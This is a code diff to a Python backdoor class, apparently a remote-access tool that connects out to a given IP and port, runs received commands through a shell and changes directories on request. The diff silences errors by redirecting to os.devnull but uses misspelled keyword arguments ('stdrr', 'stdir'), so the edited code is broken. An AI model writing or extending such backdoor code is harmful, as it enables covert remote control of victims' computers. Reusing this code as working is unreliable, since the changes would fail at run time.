@@ -4,6 +4,8 @@ import socket
 import subprocess
 import json
 import base64
+import os
+import sys
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -14,7 +16,7 @@ class Backdoor:
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
 
-	def reliable_recieve(self,command):
+	def reliable_recieve(self):
 		json_data = ""
 		while True:
 			try:
@@ -24,10 +26,9 @@ class Backdoor:
 				continue
 
 	def execute_system_command(self, command):
-		try:
-			return subprocess.check_output(command, shell=True)
-		except subprocess.CalledProcessError:
-			return "error during command execution"
+		DEVNULL = open(os.devnull, 'wb')
+		return subprocess.check_output(command, shell=True, stdrr=DEVNULL, stdir=DEVNULL)
+		
 	def change_working_directory_to(self, path):
 		os.chdir(path)
 		return "[+] changing working directory to" + path
